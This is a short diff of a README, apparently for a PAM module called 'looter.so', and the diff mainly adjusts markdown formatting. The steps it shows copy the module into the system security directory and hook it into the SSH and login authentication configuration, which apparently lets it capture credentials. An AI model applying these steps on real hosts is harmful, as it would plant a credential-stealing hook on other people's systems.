@@ -35,12 +35,12 @@ sudo cp looter.so /lib/security/
 
 sudo nano /etc/pam.d/common-auth ( Ubuntu / Debian )
 sudo nano /etc/pam.d/sshd ( CentOS / RHEL / Alma / Rocky )
-
-
+```
+## 📸 Preview
 ![Preview](https://github.com/user-attachments/assets/eac5b43b-1c2d-4078-9ecd-e1d3c48b3026)
 
 
-
+```bash
 # Tambahkan di bagian atas file
 auth optional /lib64/security/looter.so
 account optional /lib64/security/looter.so
